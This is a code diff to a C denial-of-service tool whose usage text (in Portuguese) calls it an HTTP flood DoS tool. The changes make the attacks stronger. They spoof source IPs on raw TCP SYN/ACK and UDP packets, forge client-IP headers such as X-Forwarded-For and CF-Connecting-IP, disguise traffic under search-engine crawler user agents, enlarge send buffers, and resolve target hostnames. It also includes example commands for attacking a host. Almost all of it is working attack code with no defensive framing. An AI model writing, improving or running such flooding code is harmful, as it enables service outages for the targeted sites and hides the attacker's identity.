@@ -25,8 +25,6 @@ typedef struct {
     int duration;
     int packet_size;
     int thread_id;
-    int use_raw;
-    int use_http;
     char host[128];
     char path[256];
 } attack_args_t;
@@ -65,7 +63,18 @@ const char *user_agents[] = {
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:109.0) Gecko/20100101 Firefox/120.0"
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:109.0) Gecko/20100101 Firefox/120.0",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
+    "Mozilla/5.0 (compatible; Facebookbot/1.0; +http://www.facebook.com/facebookbot)",
+    "Mozilla/5.0 (compatible; Twitterbot/1.0; +http://twitter.com/help/crawling)",
+    "Mozilla/5.0 (compatible; Applebot/1.0; +http://www.apple.com/go/applebot)",
+    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot)",
+    "Mozilla/5.0 (compatible; SemrushBot/1.0; +http://www.semrush.com/bot.html)",
+    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
 };
 
 #define NUM_USER_AGENTS (sizeof(user_agents) / sizeof(user_agents[0]))
@@ -91,13 +100,22 @@ void random_payload(unsigned char *buffer, int size) {
 }
 
 uint32_t random_ip() {
-    return (rand() & 0xFF) << 24 |
-           (rand() & 0xFF) << 16 |
-           (rand() & 0xFF) << 8 |
-           (rand() & 0xFF);
+    uint32_t ip;
+    do {
+        ip = (rand() & 0xFF) << 24 |
+             (rand() & 0xFF) << 16 |
+             (rand() & 0xFF) << 8 |
+             (rand() & 0xFF);
+    } while (ip == 0x0100007F || ip == 0x0A000000 || ip == 0xAC100000 || ip == 0xC0A80000);
+    return ip;
 }
 
 void build_http_request(char *buffer, char *host, char *path, int size, int ua_index) {
+    int r1 = rand() % 255, r2 = rand() % 255, r3 = rand() % 255, r4 = rand() % 255;
+    int r5 = rand() % 255, r6 = rand() % 255, r7 = rand() % 255, r8 = rand() % 255;
+    int r9 = rand() % 255, r10 = rand() % 255, r11 = rand() % 255, r12 = rand() % 255;
+    int r13 = rand() % 255, r14 = rand() % 255, r15 = rand() % 255, r16 = rand() % 255;
+    
     snprintf(buffer, size,
         "GET %s HTTP/1.1\r\n"
         "Host: %s\r\n"
@@ -107,24 +125,37 @@ void build_http_request(char *buffer, char *host, char *path, int size, int ua_i
         "Accept-Encoding: gzip, deflate, br\r\n"
         "Connection: keep-alive\r\n"
         "Upgrade-Insecure-Requests: 1\r\n"
-        "Cache-Control: no-cache\r\n"
+        "Cache-Control: no-cache, no-store, must-revalidate\r\n"
         "Pragma: no-cache\r\n"
+        "Expires: 0\r\n"
         "X-Forwarded-For: %d.%d.%d.%d\r\n"
         "X-Real-IP: %d.%d.%d.%d\r\n"
         "X-Client-IP: %d.%d.%d.%d\r\n"
+        "X-Originating-IP: %d.%d.%d.%d\r\n"
+        "X-Remote-IP: %d.%d.%d.%d\r\n"
+        "X-Remote-Addr: %d.%d.%d.%d\r\n"
+        "CF-Connecting-IP: %d.%d.%d.%d\r\n"
+        "True-Client-IP: %d.%d.%d.%d\r\n"
+        "X-Proxy-IP: %d.%d.%d.%d\r\n"
+        "Via: 1.1 varnish-v4, 1.1 cloudflare\r\n"
+        "X-Varnish: %d\r\n"
+        "X-Cache: HIT\r\n"
+        "X-Cache-Hits: %d\r\n"
         "Referer: http://%s/\r\n"
+        "Origin: http://%s\r\n"
         "\r\n",
-        path,
-        host,
-        user_agents[ua_index % NUM_USER_AGENTS],
+        path, host, user_agents[ua_index % NUM_USER_AGENTS],
+        r1, r2, r3, r4, r5, r6, r7, r8,
+        r9, r10, r11, r12, r13, r14, r15, r16,
         rand() % 255, rand() % 255, rand() % 255, rand() % 255,
         rand() % 255, rand() % 255, rand() % 255, rand() % 255,
         rand() % 255, rand() % 255, rand() % 255, rand() % 255,
-        host
+        rand() % 255, rand() % 255, rand() % 255, rand() % 255,
+        rand() % 100000, rand() % 1000, host, host
     );
 }
 
-void *raw_http_flood(void *arg) {
+void *http_flood_thread(void *arg) {
     attack_args_t *args = (attack_args_t *)arg;
     int sockfd;
     char packet[MAX_PACKET];
@@ -134,8 +165,8 @@ void *raw_http_flood(void *arg) {
     char *payload;
     int packet_size;
     time_t end_time;
-    char http_request[4096];
-    int ua_counter = 0;
+    char http_request[8192];
+    int ua_counter = rand() % NUM_USER_AGENTS;
 
     sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sockfd < 0) {
@@ -150,7 +181,7 @@ void *raw_http_flood(void *arg) {
         return NULL;
     }
 
-    int bufsize = 1024 * 1024 * 8;
+    int bufsize = 1024 * 1024 * 16;
     setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
 
     memset(packet, 0, MAX_PACKET);
@@ -177,6 +208,9 @@ void *raw_http_flood(void *arg) {
         tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
         payload = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));
 
+        uint32_t src_ip = random_ip();
+        uint32_t src_port = 1024 + (rand() % 64511);
+        
         ip_header->ihl = 5;
         ip_header->version = 4;
         ip_header->tos = 0;
@@ -186,13 +220,13 @@ void *raw_http_flood(void *arg) {
         ip_header->ttl = 255;
         ip_header->protocol = IPPROTO_TCP;
         ip_header->check = 0;
-        ip_header->saddr = random_ip();
+        ip_header->saddr = src_ip;
         ip_header->daddr = target_addr.sin_addr.s_addr;
 
-        tcp_header->source = htons(1024 + (rand() % 64511));
+        tcp_header->source = htons(src_port);
         tcp_header->dest = htons(args->port);
         tcp_header->seq = rand();
-        tcp_header->ack_seq = rand();
+        tcp_header->ack_seq = 0;
         tcp_header->doff = 5;
         tcp_header->syn = 1;
         tcp_header->window = htons(65535);
@@ -210,6 +244,19 @@ void *raw_http_flood(void *arg) {
             packets_sent++;
             bytes_sent += result;
             sent_count++;
+            
+            if (sent_count % 10 == 0) {
+                tcp_header->syn = 0;
+                tcp_header->ack = 1;
+                tcp_header->ack_seq = htonl(ntohl(tcp_header->seq) + 1);
+                tcp_header->seq = rand();
+                ip_header->saddr = random_ip();
+                tcp_header->source = htons(1024 + (rand() % 64511));
+                ip_header->check = 0;
+                ip_header->check = checksum((unsigned short *)packet, packet_size);
+                sendto(sockfd, packet, packet_size, 0,
+                       (struct sockaddr *)&target_addr, sizeof(target_addr));
+            }
         } else {
             error_count++;
             if (error_count < 10) {
@@ -223,7 +270,7 @@ void *raw_http_flood(void *arg) {
             usleep(1000);
         }
 
-        if (sent_count % 100 == 0) {
+        if (sent_count % 50 == 0) {
             usleep(1);
         }
     }
@@ -233,7 +280,7 @@ void *raw_http_flood(void *arg) {
     return NULL;
 }
 
-void *udp_flood(void *arg) {
+void *udp_flood_thread(void *arg) {
     attack_args_t *args = (attack_args_t *)arg;
     int sockfd;
     struct sockaddr_in target_addr;
@@ -246,7 +293,7 @@ void *udp_flood(void *arg) {
         return NULL;
     }
 
-    int bufsize = 1024 * 1024 * 8;
+    int bufsize = 1024 * 1024 * 16;
     setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
 
     target_addr.sin_family = AF_INET;
@@ -278,7 +325,7 @@ void *udp_flood(void *arg) {
     return NULL;
 }
 
-void *raw_udp_flood(void *arg) {
+void *udp_raw_flood_thread(void *arg) {
     attack_args_t *args = (attack_args_t *)arg;
     int sockfd;
     char packet[MAX_PACKET];
@@ -302,7 +349,7 @@ void *raw_udp_flood(void *arg) {
         return NULL;
     }
 
-    int bufsize = 1024 * 1024 * 8;
+    int bufsize = 1024 * 1024 * 16;
     setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
 
     memset(packet, 0, MAX_PACKET);
@@ -405,36 +452,49 @@ void *stats_thread(void *arg) {
 }
 
 void print_usage(char *program_name) {
-    printf("\n=== UDP/TCP/HTTP FLOOD DOS TOOL ===\n\n");
-    printf("Uso: %s <IP> <PORTA> <TEMPO> [OPCOES]\n\n", program_name);
+    printf("\n=== HTTP FLOOD DOS TOOL ===\n\n");
+    printf("Uso: %s <URL> <PORTA> <TEMPO> [OPCOES]\n\n", program_name);
     printf("Argumentos obrigatorios:\n");
-    printf("  IP       - Endereco IP do alvo\n");
+    printf("  URL      - URL do alvo (ex: exemplo.com ou /caminho)\n");
     printf("  PORTA    - Porta de destino\n");
     printf("  TEMPO    - Duracao do ataque em segundos\n\n");
     printf("Opcoes:\n");
     printf("  -t       - Numero de threads (padrao: %d)\n", DEFAULT_THREADS);
     printf("  -s       - Tamanho do pacote (padrao: %d)\n", DEFAULT_SIZE);
-    printf("  -r       - Raw socket com spoofing (REQUER ROOT)\n");
-    printf("  -http    - HTTP Flood com spoofing (REQUER ROOT)\n");
-    printf("  -host    - Hostname para HTTP (padrao: IP)\n");
-    printf("  -path    - Caminho HTTP (padrao: /)\n");
+    printf("  -r       - Modo UDP raw com spoofing\n");
     printf("  -h       - Ajuda\n\n");
     printf("Exemplos:\n");
-    printf("  %s 192.168.1.1 80 30\n", program_name);
-    printf("  sudo %s 192.168.1.1 443 60 -t 20 -s 1400 -r\n", program_name);
-    printf("  sudo %s 192.168.1.1 80 30 -http -host exemplo.com -path /index.php\n", program_name);
+    printf("  sudo %s exemplo.com 80 30\n", program_name);
+    printf("  sudo %s exemplo.com 443 60 -t 20 -s 1400\n", program_name);
+    printf("  sudo %s /api/test 8080 30 -t 10\n", program_name);
+    printf("  sudo %s exemplo.com 80 30 -r\n", program_name);
     printf("\n");
 }
 
+void parse_url(char *url, char *host, char *path) {
+    char *slash = strchr(url, '/');
+    if (slash == NULL) {
+        strcpy(host, url);
+        strcpy(path, "/");
+    } else {
+        int host_len = slash - url;
+        strncpy(host, url, host_len);
+        host[host_len] = '\0';
+        strcpy(path, slash);
+        if (strlen(path) == 0) {
+            strcpy(path, "/");
+        }
+    }
+}
+
 int main(int argc, char *argv[]) {
-    char *target;
+    char target[256];
+    char host[128];
+    char path[256];
     int port, duration;
     int num_threads = DEFAULT_THREADS;
     int packet_size = DEFAULT_SIZE;
     int use_raw = 0;
-    int use_http = 0;
-    char host[128] = "";
-    char path[256] = "/";
     int opt;
 
     if (argc < 4) {
@@ -442,17 +502,27 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    target = argv[1];
+    strcpy(target, argv[1]);
     port = atoi(argv[2]);
     duration = atoi(argv[3]);
 
-    struct sockaddr_in test;
-    if (inet_pton(AF_INET, target, &test.sin_addr) <= 0) {
-        printf("Erro: IP invalido: %s\n", target);
+    parse_url(target, host, path);
+
+    if (strlen(host) == 0) {
+        printf("Erro: Host invalido\n");
         return 1;
     }
 
-    strcpy(host, target);
+    struct hostent *he = gethostbyname(host);
+    if (he == NULL) {
+        printf("Erro: Nao foi possivel resolver o host: %s\n", host);
+        return 1;
+    }
+    struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
+    char ip[INET_ADDRSTRLEN];
+    strcpy(ip, inet_ntoa(*addr_list[0]));
+
+    printf("Host: %s -> IP: %s\n", host, ip);
 
     optind = 4;
     while ((opt = getopt(argc, argv, "t:s:r h")) != -1) {
@@ -479,41 +549,20 @@ int main(int argc, char *argv[]) {
         }
     }
 
-    for (int i = optind; i < argc; i++) {
-        if (strcmp(argv[i], "-http") == 0) {
-            use_http = 1;
-            use_raw = 1;
-        } else if (strcmp(argv[i], "-host") == 0 && i + 1 < argc) {
-            strncpy(host, argv[++i], sizeof(host) - 1);
-        } else if (strcmp(argv[i], "-path") == 0 && i + 1 < argc) {
-            strncpy(path, argv[++i], sizeof(path) - 1);
-        }
-    }
-
-    if (use_http && geteuid() != 0) {
+    if (geteuid() != 0) {
         printf("\n[!] HTTP FLOOD REQUER PERMISSAO DE ROOT!\n");
         printf("[!] Execute: sudo %s ...\n\n", argv[0]);
         return 1;
     }
 
-    if (use_raw && geteuid() != 0) {
-        printf("\n[!] RAW SOCKET REQUER PERMISSAO DE ROOT!\n");
-        printf("[!] Execute: sudo %s ...\n\n", argv[0]);
-        return 1;
-    }
-
-    printf("\n=== INICIANDO ATAQUE ===\n");
-    printf("Alvo: %s:%d\n", target, port);
+    printf("\n=== INICIANDO ATAQUE HTTP ===\n");
+    printf("Alvo: %s (%s:%d)\n", host, ip, port);
+    printf("Path: %s\n", path);
     printf("Duracao: %d segundos\n", duration);
     printf("Threads: %d\n", num_threads);
     printf("Tamanho do pacote: %d bytes\n", packet_size);
-    if (use_http) {
-        printf("Tipo: HTTP Flood com spoofing\n");
-        printf("Host: %s\n", host);
-        printf("Path: %s\n", path);
-    } else {
-        printf("Tipo: %s\n", use_raw ? "UDP Raw (spoofing)" : "UDP Normal");
-    }
+    printf("Modo: %s\n", use_raw ? "UDP Raw (spoofing)" : "HTTP TCP com spoofing");
+    printf("User Agents: %d diferentes\n", NUM_USER_AGENTS);
     printf("==========================\n\n");
 
     srand(time(NULL) ^ getpid() ^ (unsigned long)pthread_self());
@@ -523,22 +572,18 @@ int main(int argc, char *argv[]) {
     attack_args_t *args = malloc(num_threads * sizeof(attack_args_t));
 
     for (int i = 0; i < num_threads; i++) {
-        strncpy(args[i].target, target, sizeof(args[i].target) - 1);
+        strncpy(args[i].target, ip, sizeof(args[i].target) - 1);
         args[i].port = port;
         args[i].duration = duration;
         args[i].packet_size = packet_size;
         args[i].thread_id = i;
-        args[i].use_raw = use_raw;
-        args[i].use_http = use_http;
         strncpy(args[i].host, host, sizeof(args[i].host) - 1);
         strncpy(args[i].path, path, sizeof(args[i].path) - 1);
 
-        if (use_http) {
-            pthread_create(&threads[i], NULL, raw_http_flood, &args[i]);
-        } else if (use_raw) {
-            pthread_create(&threads[i], NULL, raw_udp_flood, &args[i]);
+        if (use_raw) {
+            pthread_create(&threads[i], NULL, udp_raw_flood_thread, &args[i]);
         } else {
-            pthread_create(&threads[i], NULL, udp_flood, &args[i]);
+            pthread_create(&threads[i], NULL, http_flood_thread, &args[i]);
         }
     }
 
